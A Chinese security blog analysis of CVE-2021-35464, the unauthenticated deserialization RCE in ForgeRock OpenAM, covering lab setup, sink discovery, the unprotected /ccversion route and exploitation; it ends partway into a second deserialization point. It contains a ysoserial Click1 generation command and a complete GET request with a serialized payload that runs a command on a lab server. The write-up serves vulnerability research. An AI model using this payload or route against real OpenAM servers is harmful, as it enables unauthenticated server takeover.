> 原文链接: https://www.anquanke.com//post/id/247357 


# ForgeRock OpenAM RCE（CVE-2021-35464）分析


                                阅读量   
                                **42467**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01f20767c799e6dec2.jpg)](https://p3.ssl.qhimg.com/t01f20767c799e6dec2.jpg)



## 0x01 漏洞描述

2021年6月30日，国外安全研究人员披露了ForgeRock AM远程代码执行漏洞，漏洞编号为CVE-2021-35464。攻击者可在无需认证的情况下，通过构造特殊的请求，触发反序列化，从而执行任意代码，接管运行ForgeRock AM的服务器。本文从漏洞挖掘的角度分析其中的技术细节，也将公开一些其他的反序列化点。



## 0x02 环境搭建

### <a class="reference-link" name="0x1%20Docker%20%E6%90%AD%E5%BB%BA"></a>0x1 Docker 搭建

直接使用官方提供的docker资源进行搭建，并开启调试环境

[![](https://p3.ssl.qhimg.com/t019a04af5aac34d26f.png)](https://p3.ssl.qhimg.com/t019a04af5aac34d26f.png)

```
docker run  -d -p 7080:8080 -p 5005:5005 --name openam openidentityplatform/openam:14.6.2
docker run -d -p 1389:1389 -p 1636:1636 -p 4444:4444 --name ldap-01 openidentityplatform/opendj
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018f870d49296a78fb.png)

[![](https://p5.ssl.qhimg.com/t018737a52848fbde27.png)](https://p5.ssl.qhimg.com/t018737a52848fbde27.png)

### <a class="reference-link" name="0x2%20%E6%B7%BB%E5%8A%A0%E4%BE%9D%E8%B5%96"></a>0x2 添加依赖

向IDEA中添加依赖

[![](https://p5.ssl.qhimg.com/t01ebcf3942af04277c.png)](https://p5.ssl.qhimg.com/t01ebcf3942af04277c.png)

### <a class="reference-link" name="0x2%20%E5%BC%80%E5%90%AF%E8%B0%83%E8%AF%95"></a>0x2 开启调试

官方提供的Docker 容器不是root权限的用户，里面也没有sudo指令，我们要想办法把权限提升到root才能有机会开启调试配置

```
openam@6eb4404f536b:/usr/local/tomcat$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
openam:x:1001:0::/home/openam:/bin/sh
```

通过查看/etc/passwd文件得知openam用户的uid为1001，我们将其强制性修改成0，并利用docker cp指令进行替换，效果如下安装一些必要的软件vim等

[![](https://p0.ssl.qhimg.com/t017d18afd53bc4f37e.png)](https://p0.ssl.qhimg.com/t017d18afd53bc4f37e.png)

看目录像是tomcat起的，所以开启调试就很明确了，找打catalina.sh添加调试信息，添加此行配置

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01cf0aebaa4044918a.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01dadb16c885f6e7ea.png)

显示Connected则连接成功

[![](https://p2.ssl.qhimg.com/t0140da735cd4a948fd.png)](https://p2.ssl.qhimg.com/t0140da735cd4a948fd.png)



## 0x03 漏洞挖掘

按照漏洞挖掘者的原话，分析web.xml中的每一个servlet，认真梳理其中的处理逻辑，跟着这个思路走，确实可以找到这个漏洞的路由，但是这样正向分析起来工作量巨大。但如果实现知道危险函数所在的文件及函数会更方便漏洞挖掘工作。针对这个漏洞来讲，我们只需要搜索readObject关键字就能找到这个漏洞点。

首先将WEB-INF/lib目录下的jar包全部解压

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t019430e5107f117bf7.png)

直接在命令行中搜索关键字readObject，会有搜索到很多相关的class文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01314c59a2a1b95fd0.png)

尝试打开其中的几个文件

openam-shared-14.6.3/org/forgerock/openam/utils/IOUtils.class ,该文件中存在deserialise函数，但是在反序列化的时候有白名单，因此寻找下一个类。

[![](https://p1.ssl.qhimg.com/t01b4001288d074a0bf.png)](https://p1.ssl.qhimg.com/t01b4001288d074a0bf.png)

[![](https://p1.ssl.qhimg.com/t01e6944a991d58d916.png)](https://p1.ssl.qhimg.com/t01e6944a991d58d916.png)

关于这个路由的分析统一放在漏洞路由分析中讲解。

下一个匹配到的class是 jato-14.6.3/com/iplanet/jato/util/Encoder.class

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01eb0582f1bb826c92.png)

再次搜索关于Encoder类的调用，可以找到几个相关联的类，因为分析过以下几个代码，所以这里直接看ViewBeanBase代码中的逻辑。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015f88046220c2aca2.png)

ViewBeanBase.class代码如下

[![](https://p5.ssl.qhimg.com/t014541eb8843fe5308.png)](https://p5.ssl.qhimg.com/t014541eb8843fe5308.png)

找到反序列化的入口后有两个问题需要我们解决
- 如何找到触发漏洞的路由
- 如何编写反序列化利用链
下面主要围绕这两个问题进行分析。



## 0x04 漏洞路由分析

如何才能通过前端访问触发该漏洞呢，这还是要结合着web.xml进行分析，在这个xml文件中定义了很多servlet，很多URL与之对应着。

### <a class="reference-link" name="0x1%20xml%E5%88%86%E6%9E%90"></a>0x1 xml分析

通过分析Servlet后，找到了感兴趣的Servlet，比如这里以TaskServlet为例

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016198ff743704e226.png)

## 0x2 请求处理

TaskServlet继承ConsoleServletBase，对前端发送来的请求是父类的父类做的处理.

[![](https://p0.ssl.qhimg.com/t011c37204908730eb8.png)](https://p0.ssl.qhimg.com/t011c37204908730eb8.png)

可以清楚的看到ConsoleServletBase继承ApplicationServletBase。

[![](https://p5.ssl.qhimg.com/t018073c3a137d28369.png)](https://p5.ssl.qhimg.com/t018073c3a137d28369.png)

ApplicationServletBase中包含get和post请求方法的响应代码，最后都会调用processRequest进行统一处理。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d02b8ac67b248fcd.png)

至此我们分析到了第一层请求处理逻辑，剩下还有很多路要走，先来看一下openAM怎么对路由进行权限校验的。

### <a class="reference-link" name="0x3%20%E6%9D%83%E9%99%90%E6%A0%A1%E9%AA%8C"></a>0x3 权限校验

通过分析ApplicationServletBase的processRequest处理函数，该函数在处理请求期间调用了fireBeforeRequestEvent函数，并且这个函数最终会调用onBeforeRequest函数。

[![](https://p0.ssl.qhimg.com/t01fbf543bd3ebea93f.png)](https://p0.ssl.qhimg.com/t01fbf543bd3ebea93f.png)

[![](https://p2.ssl.qhimg.com/t0128d5500dac17bc05.png)](https://p2.ssl.qhimg.com/t0128d5500dac17bc05.png)

TaskServlet的父类ConsoleServletBase中有对onBeforeRequest的实现，并且在里面做了权限校验。validateSSOToken里校验了token的是否合法。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f8f77b21ee1ecc66.png)

### <a class="reference-link" name="0x4%20%E6%9C%AA%E8%AE%A4%E8%AF%81%E8%B7%AF%E7%94%B1"></a>0x4 未认证路由

那么是不是存在一个路由的onBeforeRequest没有校验token呢，通过对每个servlet进行分析，确实找到了不同于ConsoleServletBase父类的类TagsServletBase。该servlet对应的路由为/ccversion/*

[![](https://p3.ssl.qhimg.com/t01092b637a63d73ca4.png)](https://p3.ssl.qhimg.com/t01092b637a63d73ca4.png)

[![](https://p5.ssl.qhimg.com/t014636d0ac6d21dce7.png)](https://p5.ssl.qhimg.com/t014636d0ac6d21dce7.png)

那么它到底特殊在什么地方呢？通过查看代码可以得知在父类ApplicationServletBase之前的子类都没有实现onBeforeRequest方法，这就使得在调用onBeforeRequest方法时实则调用了ApplicationServletBase里的方法，然而ApplicationServletBase里onBeforeRequest方法是空函数。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t011c1a1f2cd110c07c.png)

那么这个检验就可以轻易绕过了。

### <a class="reference-link" name="0x5%20%E5%8A%A8%E6%80%81%E5%88%86%E5%8F%91"></a>0x5 动态分发

分析到这都是静态路由在处理，openAm在处理请求的时候大部分采用的动态Bean调用，我们一起来看看到底是怎么实现的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01fd0a983d970fd854.png)

主要观察上面代码的381行和384行，通过getViewBeanInstance获取到pageName对应的Bean实例，再用dispatchRequest方法将其分发，分发时执行的函数为forwardTo。

[![](https://p2.ssl.qhimg.com/t011214303e36e4c30a.png)](https://p2.ssl.qhimg.com/t011214303e36e4c30a.png)

问题是怎么获取到这些Bean实例的，我们通过动态调试的方式一起分析下。

getViewBeanInstance函数会调用getLocalViewBean函数去查找并生成viewBean

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b51e2e3152358680.png)

getLocalViewBean函数就比较有意思，利用getHandlingServlet获取当前线程运行的Servlet，判断是否allowShortViewBeanNames字段之后进入if else分之，getBasePackageName函数会获取调用者的包名，这里的调用者是VersionServlet其包名为com.sun.identity.console.version。

[![](https://p3.ssl.qhimg.com/t01a949ccffd06c81d9.png)](https://p3.ssl.qhimg.com/t01a949ccffd06c81d9.png)

getViewBeanByClassName会通过字符串的形式动态的加载类到内存中，但在加载之前会先判断有没有实例已经生成，如果有的话就会在nameInstanceMap中匹配到，就不需要通过Class.forName的方式去动态生成了。

[![](https://p0.ssl.qhimg.com/t015f5d024f71ff14ab.png)](https://p0.ssl.qhimg.com/t015f5d024f71ff14ab.png)

因此这个ViewServlet路由最终会调用执行com.sun.identity.console.version包下的*ViewBean代码，这也就和之前的漏洞点串起来了，剩下的只需要考虑下如何进行利用了。



## 0x05 漏洞利用分析

再次回顾下此次漏洞点，通过Encoder.decodeHttp64函数进行解码后，传递给Encoder.deserialize函数进行反序列化，反序列化代码逻辑处没有过滤，我们可以在项目中的jar包里搜索可利用的利用链。

```
this.setPageSessionAttributes((Map)Encoder.deserialize(Encoder.decodeHttp64(pageAttributesParam), false));
```

从项目的lib目录中发现的几个ysoserial中用来构造反序列化的jar包版本都对应不上，这就意味着要重新寻找个反序列化利用链。关于怎么找链以及怎么构造ysoserial Click1利用链，我打算开篇新的文章记录下。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01de15866e0e070f75.png)

### <a class="reference-link" name="0x1%20%E7%94%9F%E6%88%90%E5%88%A9%E7%94%A8%E9%93%BE"></a>0x1 生成利用链

在进行漏洞利用的时候暂且直接使用集成在ysoserial工具里的Click1利用链。

[![](https://p1.ssl.qhimg.com/t018c2ec1d2177dfee7.png)](https://p1.ssl.qhimg.com/t018c2ec1d2177dfee7.png)

```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Click1 "touch /tmp/xx" | (echo -ne \\x00 &amp;&amp; cat) | base64 | tr '/+' '_-' | tr -d '='
```

### <a class="reference-link" name="0x2%20%E6%9E%84%E9%80%A0%E6%95%B0%E6%8D%AE%E5%8C%85"></a>0x2 构造数据包

```
GET /openam/ccversion/Version?jato.pageSession=AKztAAVzcgAXamF2YS51dGlsLlByaW9yaXR5UXVldWWU2jC0-z-CsQMAAkkABHNpemVMAApjb21wYXJhdG9ydAAWTGphdmEvdXRpbC9Db21wYXJhdG9yO3hwAAAAAnNyADBvcmcuYXBhY2hlLmNsaWNrLmNvbnRyb2wuQ29sdW1uJENvbHVtbkNvbXBhcmF0b3IAAAAAAAAAAQIAAkkADWFzY2VuZGluZ1NvcnRMAAZjb2x1bW50ACFMb3JnL2FwYWNoZS9jbGljay9jb250cm9sL0NvbHVtbjt4cAAAAAFzcgAfb3JnLmFwYWNoZS5jbGljay5jb250cm9sLkNvbHVtbgAAAAAAAAABAgATWgAIYXV0b2xpbmtaAAplc2NhcGVIdG1sSQAJbWF4TGVuZ3RoTAAKYXR0cmlidXRlc3QAD0xqYXZhL3V0aWwvTWFwO0wACmNvbXBhcmF0b3JxAH4AAUwACWRhdGFDbGFzc3QAEkxqYXZhL2xhbmcvU3RyaW5nO0wACmRhdGFTdHlsZXNxAH4AB0wACWRlY29yYXRvcnQAJExvcmcvYXBhY2hlL2NsaWNrL2NvbnRyb2wvRGVjb3JhdG9yO0wABmZvcm1hdHEAfgAITAALaGVhZGVyQ2xhc3NxAH4ACEwADGhlYWRlclN0eWxlc3EAfgAHTAALaGVhZGVyVGl0bGVxAH4ACEwADW1lc3NhZ2VGb3JtYXR0ABlMamF2YS90ZXh0L01lc3NhZ2VGb3JtYXQ7TAAEbmFtZXEAfgAITAAIcmVuZGVySWR0ABNMamF2YS9sYW5nL0Jvb2xlYW47TAAIc29ydGFibGVxAH4AC0wABXRhYmxldAAgTG9yZy9hcGFjaGUvY2xpY2svY29udHJvbC9UYWJsZTtMAA10aXRsZVByb3BlcnR5cQB-AAhMAAV3aWR0aHEAfgAIeHAAAQAAAABwcHBwcHBwcHBwdAAQb3V0cHV0UHJvcGVydGllc3Bwc3IAHm9yZy5hcGFjaGUuY2xpY2suY29udHJvbC5UYWJsZQAAAAAAAAABAgAXSQAOYmFubmVyUG9zaXRpb25aAAlob3ZlclJvd3NaABdudWxsaWZ5Um93TGlzdE9uRGVzdHJveUkACnBhZ2VOdW1iZXJJAAhwYWdlU2l6ZUkAE3BhZ2luYXRvckF0dGFjaG1lbnRaAAhyZW5kZXJJZEkACHJvd0NvdW50WgAKc2hvd0Jhbm5lcloACHNvcnRhYmxlWgAGc29ydGVkWgAPc29ydGVkQXNjZW5kaW5nTAAHY2FwdGlvbnEAfgAITAAKY29sdW1uTGlzdHQAEExqYXZhL3V0aWwvTGlzdDtMAAdjb2x1bW5zcQB-AAdMAAtjb250cm9sTGlua3QAJUxvcmcvYXBhY2hlL2NsaWNrL2NvbnRyb2wvQWN0aW9uTGluaztMAAtjb250cm9sTGlzdHEAfgAQTAAMZGF0YVByb3ZpZGVydAAsTG9yZy9hcGFjaGUvY2xpY2svZGF0YXByb3ZpZGVyL0RhdGFQcm92aWRlcjtMAAZoZWlnaHRxAH4ACEwACXBhZ2luYXRvcnQAJUxvcmcvYXBhY2hlL2NsaWNrL2NvbnRyb2wvUmVuZGVyYWJsZTtMAAdyb3dMaXN0cQB-ABBMAAxzb3J0ZWRDb2x1bW5xAH4ACEwABXdpZHRocQB-AAh4cgAob3JnLmFwYWNoZS5jbGljay5jb250cm9sLkFic3RyYWN0Q29udHJvbAAAAAAAAAABAgAJTAAOYWN0aW9uTGlzdGVuZXJ0ACFMb3JnL2FwYWNoZS9jbGljay9BY3Rpb25MaXN0ZW5lcjtMAAphdHRyaWJ1dGVzcQB-AAdMAAliZWhhdmlvcnN0AA9MamF2YS91dGlsL1NldDtMAAxoZWFkRWxlbWVudHNxAH4AEEwACGxpc3RlbmVydAASTGphdmEvbGFuZy9PYmplY3Q7TAAObGlzdGVuZXJNZXRob2RxAH4ACEwABG5hbWVxAH4ACEwABnBhcmVudHEAfgAXTAAGc3R5bGVzcQB-AAd4cHBwcHBwcHBwcAAAAAIAAQAAAAAAAAAAAAAAAQAAAAAAAAAAAXBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHhwcHBwcHBwcHBwdwQAAAADc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAITAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA_____3VyAANbW0JL_RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF_gGCFTgAgAAeHAAAAajyv66vgAAADMAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk_OR3e8-AQAGPGluaXQ-AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ-AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEADXRvdWNoIC90bXAveHgIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXI4MTE5NjYyNDE4OTUwMDIBACBMeXNvc2VyaWFsL1B3bmVyODExOTY2MjQxODk1MDAyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AJAAAAdTK_rq-AAAAMwAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4c3IAFGphdmEubWF0aC5CaWdJbnRlZ2VyjPyfH6k7-x0DAAZJAAhiaXRDb3VudEkACWJpdExlbmd0aEkAE2ZpcnN0Tm9uemVyb0J5dGVOdW1JAAxsb3dlc3RTZXRCaXRJAAZzaWdudW1bAAltYWduaXR1ZGV0AAJbQnhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cP_______________v____4AAAABdXEAfgAkAAAAAQF4eA HTTP/1.1
Host: 192.168.0.106:7080
User-Agent: curl/7.64.1
Accept: */*

```

后台代码成功接受数据并进行反序列化

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01333973d6aaba55a3.png)

成功执行命令创建文件xx

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01eb453a4cc40afb62.png)

关于反序列化漏洞挖掘的方式，及路由回溯方法在其他分析中展开讲解，这个漏洞的反序列化链编写过程打算在下篇文章重点分析。



## 0x06 其他分析

为什么有这一小节呢？我再复现分析这个漏洞的时候尝试性的对它开展了漏洞挖掘工作，其中找到了一个未认证反序列化，但是有白名单的限制，最后没有利用成功。主要记录下该反序列化点的挖掘及触发过程。

### <a class="reference-link" name="0x1%20%E5%8F%AF%E7%96%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%82%B9"></a>0x1 可疑的漏洞点

借助之前搜索readObject的结果，我们可以发现这个带有反序列化白名单校验的类IOUtils.class，我一开始不知道其中有白名单校验，就傻不愣登的开始分析了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ab034ed073734eca.png)​

### <a class="reference-link" name="0x2%20%E8%A7%A6%E5%8F%91%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"></a>0x2 触发路由分析

通过字符串搜索找到包含IOUtils且包含了deserialize的class文件，其中的分析过一遍后感觉RestrictedTokenContext比较有戏。

[![](https://p2.ssl.qhimg.com/t0186a0eb4e2183ec44.png)](https://p2.ssl.qhimg.com/t0186a0eb4e2183ec44.png)

RestrictedTokenContext主要是unmarshal方法调用了危险函数，我们需要继续向上分析调用点

[![](https://p5.ssl.qhimg.com/t01e0b9f72c89679619.png)](https://p5.ssl.qhimg.com/t01e0b9f72c89679619.png)

通过相同的搜索方式找到了一些调用点其中SessionRequestHandler引起了我的注意

